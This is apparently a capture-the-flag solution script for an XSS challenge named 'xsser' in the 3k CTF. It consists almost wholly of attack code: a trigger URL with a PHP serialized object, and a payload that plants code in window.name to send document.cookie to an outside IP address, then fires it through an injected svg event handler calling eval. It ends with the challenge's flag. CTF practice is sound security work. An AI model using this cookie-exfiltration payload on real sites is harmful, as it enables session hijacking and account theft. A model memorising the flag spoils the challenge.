/*
    XSS Trigger

    http://xsser.3k.ctf.to/?login=O:11:"Traversable":0:{}
*/

/* 
    XSS Payload

    window.name = "document.location = `http://141.164.55.161:8080/info.php?data=` + document.cookie";
    window.location = "http://127.0.0.1/?login=?login=O:11:%22Traversable%22:0:{}&new=<svg/onliad=eval(name)?>";
*/

// Output : 3k{3asy_XsS_&_pHp_Ftw}